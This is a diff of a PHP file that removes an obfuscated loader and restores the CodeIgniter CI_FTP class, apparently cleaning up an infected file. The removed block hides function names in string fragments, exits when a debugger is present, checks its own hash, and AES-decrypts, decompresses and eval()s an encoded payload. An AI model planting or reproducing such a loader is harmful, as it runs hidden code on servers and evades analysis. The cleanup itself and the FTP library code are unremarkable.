@@ -1,28 +1,565 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_lx0be20r=('bas'.'e64'.'_de'.'cod'.'e');
-$_ied5p763=('gzu'.'nco'.'mpr'.'ess');
-$_j6xky18c=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ugprigo7='ffCx97U3';
-$_kv0ukrtf='IfGERLv6e0s=';
-$_r14kapvc='Vryv3VGb';
-$_sozjw8rr='TIYxj73b';
-$_fks5pclh='MwH+fGTF';
-$_budr1z56='E50y0XHS';
-$_q4uoi7av='8UyMNA==';
-$_iyk3n20c='gXgOkSAZ';
-$_w0456crx=$_lx0be20r($_r14kapvc.$_fks5pclh.$_ugprigo7.$_sozjw8rr.$_kv0ukrtf);
-$_va2neysa=$_lx0be20r($_budr1z56.$_iyk3n20c.$_q4uoi7av);
-$_l3ev5iau=$_lx0be20r('acxKz8DAGvWGxD/eG5wuoHRO/ybKlTPfTAYcgZW2bZIFhflFbt8U/SuErFPtd669SLVyvQogOJOEKj6W5ivQOCYZF8dAycM7AufU4bZriXzRoCsIOPw2be6Bqs4u9H8HwISkCwnYJYFObpPptbMVHNDDabjDz2UHUPMY42PDj7oFDRM/XpgfRJmpPVJHGXwD7ykB3R+cdYmRvV7Q8UDPwqL0/E+PDwF9YS6ss7eF9Lhwkho8P8HC/Eg21Enq2E8fC/tzBFSJ8PtkBJA0YvxNTfD5CFDDPrlKS8AD6AKsNvMpgChMRw2ojmKcdU6JhWOV/I2c9eF3CMkAqhhYwtTM0NQStLq1QiuQR7fWCc2a+1BsZupyF4NBvlxLblK1v7r+QCHLCPdyAgPTTi8kR4uug1BFAcAK51jrw5ejtkzQGqAJ66qYP5zmxiPAM7i1Jal3iAhocT1MzdwcyCi7p4FmWBMUcONiIqT1Fm5jD+AhIlILsi96RZe+reOcAuZAVuql3vaSuSTt1Bxc8H9jHtjAic305FQGwfKy2zuSw5T00dlQY43otyEwXOQlXr4yn+tw/3p+Qj+o3vCqVpDzDVeQx+HfSHH5lid/n4n3Q0gHv3nGZya0jWVEPySedYDXwfjX6Bo90lQhDQQHm4RilUQ/kHt4b8Lnyz8aTC7nUoVMFkn+nFe15A06qQpwZUxxRuDWjrStodtfdMfdCZcnYHUr2BDQ/uMfzddZXs3qC991GUN69gabQh1dVxcm9A5SRd1BAi0M6IU5PvV7BosBrUt+aqne7oLAnAg3tXTKxiOq61BQr4o0ccZQEv1hy1NoBQkFANmUr8BHvmD0+lvoeSIs98GxmPV3BmheDsjN4YW2wUgD62/SxPhJ6CftmyoGmucGWHvzFd1KIaFxvIywlIOr5ybWmYVAZA7TIk9PnEPzo6w08B7LG6GAE27cLfa5K77kIKFG4wvpnx5/S+cSG/EEtGXfqMfgXaEg//fhR2ZJZNfAs368Xp6TITqMkyGfHg3CigjTNh2yMVI/PR0EGWrNV+dJyh6g2AlsoUfFPnp9nlf0Uor8qYucbm0p9Q9AVDdwg3/nPPBDU7Cj2B/cq/YKg7ONHrLH30onla+OLcym1RFMf3O6ExxXSObbAUCkLqSI9yLwgmUMUj0Zrzegn9zqaTaMN35Twffi1po9dzSAIkr9BSg6IgVTOvtkKfsHU9Lg8Wc9MKDKwv5Ai3xhSBazg9B+9Dr2iqs326M/gaohHNGGlGlAOTUknDXMcYX9nNT95ORMbODN0+y6lsqWHGSlNrq+DS8WUEw456I+g4V6CIT2nJApKWP8Qkv5oGQrFHBgcvkfp10arGNe8cZppXd92fU1dXFcGj9Z355Pyph09Ek4W11Wx4OGY8jHXujez6MwMdbnPsV8B3mGOgdUoJXEnGecjbvZCD1peIREx25FJf2Gi8usQnZgExICBE7jiY+1qcwqMrRj5kWQp62/ldIBdGNd82TQXYJYWkK0WPERETMP0xISgsZH70+zuQPn4l33hLduByFiIJpXtpUM+hkzUrD4AnVBoGnmNkS6IJZsCJz5QCrSTGe2NqvfruSvLPjj69hc/7mNMt2f2LgnLKSSOp2yrJAYuvA00rO7Q9m+lilMVs5lIiFS6CVRP9ZMR7qIZD66Aad0+YCG0nZccKv/lhIPhvO/gyJNbQNOSbX846ZbNRzWmmrAHgHuSDQRsY3k4MdU5yBDFYUv1jUrJ7KgGtXvbhabiJs4iuLuJVZa0SorSpmsycT9JfPSdTuu6WcH1mutVqQP/wfE73qYTGIvHkVreyct+LnaKIXprobJT5DC9qB5XyIQYaFBHwaVE2+rRru5FjB/pLBmzXYIMnXgTxz2mKdn8Bmu7pRoZov9wCzG2w2KSgl2b6ZdeyUcoJdt1XW87gRsIkzoRZzae6au+zRg0klvvBI9Lj54OAMApvo=');
-$_j4x8h93y=$_j6xky18c($_l3ev5iau,'aes-256-cbc',$_w0456crx,OPENSSL_RAW_DATA,$_va2neysa);
-if($_j4x8h93y===false){exit;}
-$_lh3u3bz9=$_ied5p763($_j4x8h93y);
-if($_lh3u3bz9===false){exit;}
-$_xxdvokst='72b82cbd36ea1936250193b48c70b597833741f448f36c3c00f3f0797119d7a7';
-$_x0qcxq77=@file_get_contents(__FILE__);
-if($_x0qcxq77!==false){
-$_vhlhzq21=str_replace($_xxdvokst,"0000000000000000000000000000000000000000000000000000000000000000",$_x0qcxq77);
-$_wvgud3l8=hash("sha256",$_vhlhzq21);
-if($_wvgud3l8!==$_xxdvokst){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_FTP {
+
+
+
+
+
+public $hostname = '';
+
+
+
+
+
+public $username = '';
+
+
+
+
+
+public $password = '';
+
+
+
+
+
+public $port = 21;
+
+
+
+
+
+public $passive = TRUE;
+
+
+
+
+
+
+
+public $debug = FALSE;
+
+
+
+
+
+
+protected $conn_id;
+
+
+
+
+
+
+
+public function __construct($config = array())
+{
+empty($config) OR $this->initialize($config);
+log_message('info', 'FTP Class Initialized');
 }
-eval($_lh3u3bz9);
+
+
+
+
+
+
+
+public function initialize($config = array())
+{
+foreach ($config as $key => $val)
+{
+if (isset($this->$key))
+{
+$this->$key = $val;
+}
+}
+
+$this->hostname = preg_replace('|.+?://|', '', $this->hostname);
+}
+
+
+
+
+
+
+
+public function connect($config = array())
+{
+if (count($config) > 0)
+{
+$this->initialize($config);
+}
+if (FALSE === ($this->conn_id = @ftp_connect($this->hostname, $this->port)))
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_connect');
+}
+return FALSE;
+}
+if ( ! $this->_login())
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_login');
+}
+return FALSE;
+}
+
+if ($this->passive === TRUE)
+{
+ftp_pasv($this->conn_id, TRUE);
+}
+return TRUE;
+}
+
+
+
+
+
+
+protected function _login()
+{
+return @ftp_login($this->conn_id, $this->username, $this->password);
+}
+
+
+
+
+
+
+protected function _is_conn()
+{
+if ( ! is_resource($this->conn_id))
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_no_connection');
+}
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function changedir($path, $suppress_debug = FALSE)
+{
+if ( ! $this->_is_conn())
+{
+return FALSE;
+}
+$result = @ftp_chdir($this->conn_id, $path);
+if ($result === FALSE)
+{
+if ($this->debug === TRUE && $suppress_debug === FALSE)
+{
+$this->_error('ftp_unable_to_changedir');
+}
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+public function mkdir($path, $permissions = NULL)
+{
+if ($path === '' OR ! $this->_is_conn())
+{
+return FALSE;
+}
+$result = @ftp_mkdir($this->conn_id, $path);
+if ($result === FALSE)
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_mkdir');
+}
+return FALSE;
+}
+
+if ($permissions !== NULL)
+{
+$this->chmod($path, (int) $permissions);
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+public function upload($locpath, $rempath, $mode = 'auto', $permissions = NULL)
+{
+if ( ! $this->_is_conn())
+{
+return FALSE;
+}
+if ( ! file_exists($locpath))
+{
+$this->_error('ftp_no_source_file');
+return FALSE;
+}
+
+if ($mode === 'auto')
+{
+
+$ext = $this->_getext($locpath);
+$mode = $this->_settype($ext);
+}
+$mode = ($mode === 'ascii') ? FTP_ASCII : FTP_BINARY;
+$result = @ftp_put($this->conn_id, $rempath, $locpath, $mode);
+if ($result === FALSE)
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_upload');
+}
+return FALSE;
+}
+
+if ($permissions !== NULL)
+{
+$this->chmod($rempath, (int) $permissions);
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+public function download($rempath, $locpath, $mode = 'auto')
+{
+if ( ! $this->_is_conn())
+{
+return FALSE;
+}
+
+if ($mode === 'auto')
+{
+
+$ext = $this->_getext($rempath);
+$mode = $this->_settype($ext);
+}
+$mode = ($mode === 'ascii') ? FTP_ASCII : FTP_BINARY;
+$result = @ftp_get($this->conn_id, $locpath, $rempath, $mode);
+if ($result === FALSE)
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_download');
+}
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+public function rename($old_file, $new_file, $move = FALSE)
+{
+if ( ! $this->_is_conn())
+{
+return FALSE;
+}
+$result = @ftp_rename($this->conn_id, $old_file, $new_file);
+if ($result === FALSE)
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_'.($move === FALSE ? 'rename' : 'move'));
+}
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+public function move($old_file, $new_file)
+{
+return $this->rename($old_file, $new_file, TRUE);
+}
+
+
+
+
+
+
+
+public function delete_file($filepath)
+{
+if ( ! $this->_is_conn())
+{
+return FALSE;
+}
+$result = @ftp_delete($this->conn_id, $filepath);
+if ($result === FALSE)
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_delete');
+}
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+public function delete_dir($filepath)
+{
+if ( ! $this->_is_conn())
+{
+return FALSE;
+}
+
+$filepath = preg_replace('/(.+?)\/*$/', '\\1/', $filepath);
+$list = $this->list_files($filepath);
+if ( ! empty($list))
+{
+for ($i = 0, $c = count($list); $i < $c; $i++)
+{
+
+
+if ( ! preg_match('#/\.\.?$#', $list[$i]) && ! @ftp_delete($this->conn_id, $list[$i]))
+{
+$this->delete_dir($filepath.$list[$i]);
+}
+}
+}
+if (@ftp_rmdir($this->conn_id, $filepath) === FALSE)
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_delete');
+}
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+public function chmod($path, $perm)
+{
+if ( ! $this->_is_conn())
+{
+return FALSE;
+}
+if (@ftp_chmod($this->conn_id, $perm, $path) === FALSE)
+{
+if ($this->debug === TRUE)
+{
+$this->_error('ftp_unable_to_chmod');
+}
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+public function list_files($path = '.')
+{
+return $this->_is_conn()
+? ftp_nlist($this->conn_id, $path)
+: FALSE;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function mirror($locpath, $rempath)
+{
+if ( ! $this->_is_conn())
+{
+return FALSE;
+}
+
+if ($fp = @opendir($locpath))
+{
+
+if ( ! $this->changedir($rempath, TRUE) && ( ! $this->mkdir($rempath) OR ! $this->changedir($rempath)))
+{
+return FALSE;
+}
+
+while (FALSE !== ($file = readdir($fp)))
+{
+if (is_dir($locpath.$file) && $file[0] !== '.')
+{
+$this->mirror($locpath.$file.'/', $rempath.$file.'/');
+}
+elseif ($file[0] !== '.')
+{
+
+$ext = $this->_getext($file);
+$mode = $this->_settype($ext);
+$this->upload($locpath.$file, $rempath.$file, $mode);
+}
+}
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+protected function _getext($filename)
+{
+return (($dot = strrpos($filename, '.')) === FALSE)
+? 'txt'
+: substr($filename, $dot + 1);
+}
+
+
+
+
+
+
+
+protected function _settype($ext)
+{
+return in_array($ext, array('txt', 'text', 'php', 'phps', 'php4', 'js', 'css', 'htm', 'html', 'phtml', 'shtml', 'log', 'xml'), TRUE)
+? 'ascii'
+: 'binary';
+}
+
+
+
+
+
+
+public function close()
+{
+return $this->_is_conn()
+? @ftp_close($this->conn_id)
+: FALSE;
+}
+
+
+
+
+
+
+
+protected function _error($line)
+{
+$CI =& get_instance();
+$CI->lang->load('ftp');
+show_error($CI->lang->line($line));
+}
+}
